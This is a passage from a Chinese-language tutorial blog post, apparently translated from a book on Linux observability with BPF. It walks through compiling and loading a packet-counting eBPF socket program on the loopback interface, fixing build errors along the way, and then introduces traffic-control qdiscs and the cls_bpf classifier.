class="meta-keyword">define</span> offsetof(TYPE, MEMBER) ((size_t) &amp; ((TYPE *)0)-&gt;MEMBER)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used)) </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_def</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> type;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> key_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> value_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> max_entries;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> map_flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*bpf_map_update_elem)</span><span class="params">(struct bpf_map_def *<span class="built_in">map</span>, <span class="keyword">void</span> *key,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">void</span> *value, __u64 flags)</span> </span>= (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_map_update_elem;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *(*bpf_map_lookup_elem)(struct bpf_map_def *<span class="built_in">map</span>, <span class="keyword">void</span> *key) =</span><br><span class="line">    (<span class="keyword">void</span> *)BPF_FUNC_map_lookup_elem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">load_byte</span><span class="params">(<span class="keyword">void</span> *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> off)</span> <span class="title">asm</span><span class="params">(<span class="string">"llvm.bpf.load.byte"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> countmap </span>= &#123;</span><br><span class="line">    .type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">    .max_entries = <span class="number">256</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SEC(<span class="string">"socket"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket_prog</span><span class="params">(struct __sk_buff *skb)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> proto = load_byte(skb, ETH_HLEN + offsetof(struct iphdr, protocol));</span><br><span class="line">  <span class="keyword">int</span> one = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> *el = bpf_map_lookup_elem(&amp;countmap, &amp;proto);</span><br><span class="line">  <span class="keyword">if</span> (el) &#123;</span><br><span class="line">    (*el)++;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    el = &amp;one;</span><br><span class="line">  &#125;</span><br><span class="line">  bpf_map_update_elem(&amp;countmap, &amp;proto, el, BPF_ANY);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> _license[] SEC(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br></pre></td></tr></table></figure><p>编译如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br></pre></td></tr></table></figure><p>报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br><span class="line">In file included from bpf_program.c:6:</span><br><span class="line">In file included from /usr/include/linux/string.h:7:</span><br><span class="line">In file included from /usr/include/string.h:26:</span><br><span class="line">In file included from /usr/include/bits/libc-header-start.h:33:</span><br><span class="line">In file included from /usr/include/features.h:452:</span><br><span class="line">/usr/include/gnu/stubs.h:7:11: fatal error: 'gnu/stubs-32.h' file not found</span><br><span class="line"><span class="meta">#</span><span class="bash"> include &lt;gnu/stubs-32.h&gt;</span></span><br><span class="line">          ^~~~~~~~~~~~~~~~</span><br><span class="line">1 error generated.</span><br></pre></td></tr></table></figure><p>解决办法如下</p><p><a href="https://github.com/cilium/cilium/issues/368" target="_blank" rel="noopener">https://github.com/cilium/cilium/issues/368</a></p><p>重新编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br></pre></td></tr></table></figure><h5 id="加载并附加到网络接口"><a href="#加载并附加到网络接口" class="headerlink" title="加载并附加到网络接口"></a>加载并附加到网络接口</h5><p>加载程序是实际打开我们编译的BPF ELF二进制文件<code>bpf_program.o</code>的程序，并将定义的BPF程序及其映射附加到一个套接字，该套接字是针对所观察的接口创建的，在我们的例子中是环回接口。</p><p>loader最重要的部分是ELF文件的加载：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (load_bpf_file(filename)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, bpf_log_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sock = open_raw_sock(<span class="string">"lo"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (setsockopt(sock, SOL_SOCKET, SO_ATTACH_BPF, prog_fd,</span><br><span class="line">                 <span class="keyword">sizeof</span>(prog_fd[<span class="number">0</span>]))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"setsockopt %s\n"</span>, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这将通过添加一个元素来填充<code>prog_fd</code>数组，该元素是我们加载的程序的文件描述符，我们现在可以将其附加到使用<code>open_raw_sock</code>打开的环回接口的套接字描述符上。</p><p>通过将选项<code>SO_ATTACH_BPF</code>设置为为接口打开的原始套接字来完成附加。</p><p>此时，我们的用户空间加载器能够在内核发送映射元素时查找它们：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    key = IPPROTO_TCP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;tcp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_UDP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;udp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_ICMP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;icmp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"TCP %d UDP %d ICMP %d packets\n"</span>, tcp_cnt, udp_cnt, icmp_cnt);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>为了进行查找，我们使用for循环和<code>bpf_map_look_elem</code>附加到数组映射，以便我们可以分别读取和打印TCP、UDP和ICMP数据包计数器的值</p><p><code>loader.c</code>程序完整代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bpf/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bpf/bpf_load.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bpf/sock_example.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[BPF_LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sock = <span class="number">-1</span>, i, key;</span><br><span class="line">  <span class="keyword">int</span> tcp_cnt, udp_cnt, icmp_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> filename[<span class="number">256</span>];</span><br><span class="line">  <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"%s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (load_bpf_file(filename)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, bpf_log_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sock = open_raw_sock(<span class="string">"lo"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (setsockopt(sock, SOL_SOCKET, SO_ATTACH_BPF, prog_fd,</span><br><span class="line">                 <span class="keyword">sizeof</span>(prog_fd[<span class="number">0</span>]))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"setsockopt %s\n"</span>, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    key = IPPROTO_TCP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;tcp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_UDP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;udp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_ICMP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;icmp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"TCP %d UDP %d ICMP %d packets\n"</span>, tcp_cnt, udp_cnt, icmp_cnt);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为这个程序使用的是<code>libbpf</code>，所以我们需要在下载的源码中编译它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# pwd</span><br><span class="line">/root/linux-5.4/tools/lib/bpf</span><br><span class="line">[root@VM-16-14-centos bpf]# make</span><br><span class="line">Auto-detecting system features:</span><br><span class="line">...                        libelf: [ on  ]</span><br><span class="line">...                           bpf: [ on  ]</span><br><span class="line"></span><br><span class="line">  HOSTCC   fixdep.o</span><br><span class="line">  HOSTLD   fixdep-in.o</span><br><span class="line">  LINK     fixdep</span><br><span class="line">  MKDIR    staticobjs/</span><br></pre></td></tr></table></figure><p>接着我们可以使用如下脚本编译加载器：</p><p><code>build-loader.sh</code>代码如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KERNEL_SRCTREE=$1</span><br><span class="line">LIBBPF=$&#123;KERNEL_SRCTREE&#125;/tools/lib/bpf/libbpf.a</span><br><span class="line">clang -o loader-bin -I$&#123;KERNEL_SRCTREE&#125;/tools/lib/bpf/ \</span><br><span class="line"><span class="meta">  -I$</span><span class="bash">&#123;KERNEL_SRCTREE&#125;/tools/lib -I<span class="variable">$&#123;KERNEL_SRCTREE&#125;</span>/tools/include \</span></span><br><span class="line"><span class="meta">  -I$</span><span class="bash">&#123;KERNEL_SRCTREE&#125;/tools/perf -I<span class="variable">$&#123;KERNEL_SRCTREE&#125;</span>/samples \</span></span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;KERNEL_SRCTREE&#125;/samples/bpf/bpf_load.c \</span></span><br><span class="line">  loader.c "$&#123;LIBBPF&#125;" -lelf</span><br></pre></td></tr></table></figure><p>该脚本包含一堆头文件和内核本身的<code>libbpf</code>库，因此它必须知道在哪里可以找到内核源码。 为此可以在其中替换<code>$KERNEL_SRCTREE</code>或将该脚本写入文件并使用它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ./build-loader.sh /root/linux-5.4</span><br></pre></td></tr></table></figure><p>报错如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/loader-19267c.o:(.bss+0x0): multiple definition of `bpf_log_buf&apos;</span><br><span class="line">/tmp/bpf_load-33a95f.o:(.bss+0x1000): first defined here</span><br><span class="line">clang-12: error: linker command failed with exit code 1 (use -v to see invocation)</span><br></pre></td></tr></table></figure><p>解决方法如下</p><p><a href="https://stackoverflow.com/questions/12511044/bss0x0-multiple-definition-of-proxies" target="_blank" rel="noopener">https://stackoverflow.com/questions/12511044/bss0x0-multiple-definition-of-proxies</a></p><p>即在全局变量前声明<code>extern</code>，这里我们在<code>char bpf_log_buf[BPF_LOG_BUF_SIZE]</code>处声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> bpf_log_buf[BPF_LOG_BUF_SIZE];</span><br></pre></td></tr></table></figure><p>之后重新编译会创建一个<code>loader-bin</code>文件，最终可以启动BPF程序的ELF文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ./loader-bin bpf_program.o</span><br></pre></td></tr></table></figure><p>程序加载并启动后，将执行10次转储，每秒一次显示三个协议中的每一个的数据包计数。因为程序连接到环回设备<code>lo</code>，所以你可以与加载程序一起运行ping并看到ICMP计数器增加。</p><p>运行ping来生成到<code>localhost</code>的ICMP流量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ping -c 100 127.0.0.1</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.100 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.107 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.093 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.102 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.105 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=6 ttl=64 time=0.093 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=7 ttl=64 time=0.104 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=8 ttl=64 time=0.142 ms</span><br></pre></td></tr></table></figure><p>在另一个终端中运行我们的BPF程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ./loader-bin bpf_program.o</span><br><span class="line"> TCP 0 UDP 0 ICMP 0 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 4 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 8 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 12 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 16 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 20 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 24 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 28 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 32 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 36 packets</span><br></pre></td></tr></table></figure><h3 id="基于BPF的流量控制分类器"><a href="#基于BPF的流量控制分类器" class="headerlink" title="基于BPF的流量控制分类器"></a>基于BPF的流量控制分类器</h3><p>流量控制是内核数据包调度子系统架构。由决定数据包如何流动以及如何被接受的机制和排队系统组成。流量控制的一些用例包括但不限于以下内容：</p><ul><li>优先处理某些类型的数据包</li><li>丢弃特定类型的数据包</li><li>带宽分配</li></ul><p>一般来说，当你需要重新分配系统中的网络资源时，流量控制是一种可行的方法，为了充分利用它，应该根据你想要运行的应用程序类型部署特定的流量控制配置。流量控制提供了一个可编程的分类器，称为<code>cls_bpf</code>，让钩子进入不同级别的调度操作，它们可以读取和更新套接字缓冲区和数据包元数据，以执行流量整形、跟踪、预处理等操作。</p><p><code>cls_bpf</code>中对eBPF的支持是在内核4.1中实现的，这意味着这种程序可以访问eBPF映射，支持尾调用，可以访问<code>IPv4/IPv6</code>隧道元数据，并且通常使用eBPF附带的帮助程序和实用程序。</p><p>用于与流量控制相关的网络配置进行交互的工具是<code>iproute2</code>套件的一部分，其中包含ip和tc，它们分别用于操作网络接口和流量控制配置。</p><h4 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h4><p>如前所述，<code>Traffic Control</code>和BPF程序之间存在交互点，因此你需要了解一些<code>Traffic Control</code>概念。 如果你已经掌握相关术语，请直接进入示例。</p><h5 id="Queueing-disciplines"><a href="#Queueing-disciplines" class="headerlink" title="Queueing disciplines"></a>Queueing disciplines</h5><p>排队规则(qdisc)定义了调度对象，通过更改发送方式对进入接口的数据包排队；这些对象可以是无类的或有类的。</p><p>默认的<code>qdisc</code>是<code>pfifo_fast</code>，它是无类的，将数据包入队到三个FIFO（先进先出）队列中，这些队列根据它们的优先级出队；此<code>qdisc</code>不用于虚拟设备，例如使用<code>noqueue</code>的环回(lo)或虚拟以太网设备(veth)。除了作为其调度算法的默认值外，<code>pfifo_fast</code>也不需要任何配置即可工作。</p><p>通过访问<code>/sys</code>伪文件系统，可以将虚拟接口与物理接口（设备）区分开来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ls -la /sys/class/net/</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x  2 root root 0 May 16 20:00 .</span><br><span class="line">drwxr-xr-x 66 root root 0 May 16 20:00 ..</span><br><span class="line">lrwxrwxrwx  1 root root 0 May 16 20:00 eth0 -&gt; ../../devices/pci0000:00/0000:00:05.0/virtio0/net/eth0</span><br><span class="line">lrwxrwxrwx  1 root root 0 May 16 20:00 lo -&gt; ../../devices/virtual/net/lo</span><br></pre></td></tr></table></figure><p>如果你从未听说过<code>qdiscs</code>，可以使用<code>ip a</code>命令显示当前系统中配置的网络接口列表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 52:54:00:18:26:89 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.16.14/22 brd 10.0.19.255 scope global noprefixroute eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe18:2689/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>从上述结果我们可以看到</p><ul><li>在我们的系统中有两个网络接口：<code>lo和eth0</code></li><li><code>lo</code>接口是一个虚拟接口，所以它是<code>qdisc noqueue</code></li><li><code>eth0</code>是一个物理接口。 这里的<code>qdisc</code>是<code>fq_codel</code>（公平队列控制延迟）默认不应该是 <code>pfifo_fast</code>吗？ 事实证明，我们正在测试命令的系统正在运行<code>Systemd</code>，它使用内核参数<code>net.core.default_qdisc</code>以不同的方式设置默认<code>qdisc</code>。</li></ul><p><code>noqueue qdisc</code>没有类、调度程序或分类器。它的作用是尝试立即发送数据包。如前所述，虚拟设备默认使用<code>noqueue</code>，但当你删除其当前关联的<code>qdisc</code>时，它也是对任何接口生效的。</p><p><code>fq_codel</code>是一个无类别的<code>qdisc</code>，它使用随机模型对传入的数据包进行分类，以便能够以公平的方式对流量进行排队。</p><p>我们使用ip命令来查找有关<code>qdiscs</code>的信息，但事实证明，在<code>iproute2</code>工具中还有一个名为tc的工具，它具有<code>qdiscs</code>的特定子命令，查看方式如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# tc qdisc ls</span><br><span class="line">qdisc noqueue 0: dev lo root refcnt 2 </span><br><span class="line">qdisc fq_codel 0: dev eth0 root refcnt 2 limit 10240p flows 1024 quantum 1514 target 5ms interval 100ms memory_limit 32Mb ecn drop_batch 64</span><br></pre></td></tr></table></figure><p>对于<code>lo</code>，我们基本上看到与<code>ip a</code>相同的信息，但对于<code>eth0</code>，它具有以下信息：</p><ul><li>它有能够处理10240个传入数据包的限制。</li><li>如前所述，<code>fq_codel</code>使用的随机模型希望将流量排队到不同的流中，此输出包含有关我们拥有多少个流的信息，即1024。</li></ul><p>在下一节中我们可以仔细研究有类和无类<code>qdiscs</code>以了解它们的区别以及哪些适合BPF程序。</p><h5 id="Classful-qdiscs-filters-and-classes"><a href="#Classful-qdiscs-filters-and-classes" class="headerlink" title="Classful qdiscs, filters, and classes"></a>Classful qdiscs, filters, and classes</h5><p><code>Classful qdiscs</code>允许为不同类型的流量定义类，以便对它们应用不同的规则。拥有一个 <code>qdisc</code>的类意味着它可以包含更多的<code>qdisc</code>。有了这种层次结构，我们可以使用过滤器（分类器）通过确定数据包应该入队的下一个类别来对流量进行分类。</p><p>过滤器用于根据数据包的类型将数据包分配给特定的类。 过滤器在一个有类的<code>qdiscs</code>中用于确定数据包应该在哪个类中排队，并且两个或多个过滤器可以映射到同一个类，如下图所示。 每个过滤器都使用分类器根据数据包的信息对数据包进行分类。</p><p><img src="/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/2.png" alt="2"></p><p>如前所述，<code>cls_bpf</code>是我们想用来为流量控制编写BPF程序的分类器——下一节中有一个具体的例子来说明如何使用它。</p><p><code>Classes</code>是只能存在于有类<code>qdisc</code>中的对象；<code>Classes</code>在交通控制中用于创建层次结构。一个类可以附加过滤器，这样就可以实现复杂的层次结构，然后可以将其用作另一个<code>class</code>或<code>qdisc</code>的入口点。</p><h5 id="Classless-qdiscs"><a href="#Classless-qdiscs" class="headerlink" title="Classless qdiscs"></a>Classless qdiscs</h5><p>无类的<code>qdisc</code>不能有任何孩子的<code>qdisc</code>，因为它不允许有任何关联的类。这意味着不可能将过滤器附加到无类<code>qdisc</code>。我们不能给它们添加过滤器和分类器，从BPF的角度来看，无类 <code>qdisc</code>并不有趣，但对于简单的流量控制需求仍然有用。</p><p>在积累了一些关于<code>qdiscs</code>、过滤器和类的知识之后，我们将展示如何为<code>cls_bpf</code>分类器编写BPF程序。</p><h4 id="使用cls-bpf的流量控制分类器程序"><a href="#使用cls-bpf的流量控制分类器程序" class="headerlink" title="使用cls_bpf的流量控制分类器程序"></a>使用cls_bpf的流量控制分类器程序</h4><p>流量控制是一种强大的机制，分类器使得它变得更加强大；但是，在所有分类器中，有一个允许你对网络数据路径<code>cls_bpf</code>分类器进行编程。这个分类器很特别，因为它可以运行BPF程序，这意味着<code>cls_bpf</code>将允许你直接在入口和出口层中<code>hook</code>BPF程序，并且运行<code>hook</code>到这些层的BPF程序能够访问相应数据包的<code>sk_buff</code>结构。</p><p>为了更好地理解流量控制和BPF程序之间的这种关系，请参见下图使用流量控制加载BPF程序，它显示了如何根据<code>cls_bpf</code>分类器加载BPF程序。</p><p><img src="/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/3.png" alt="3"></p><p> 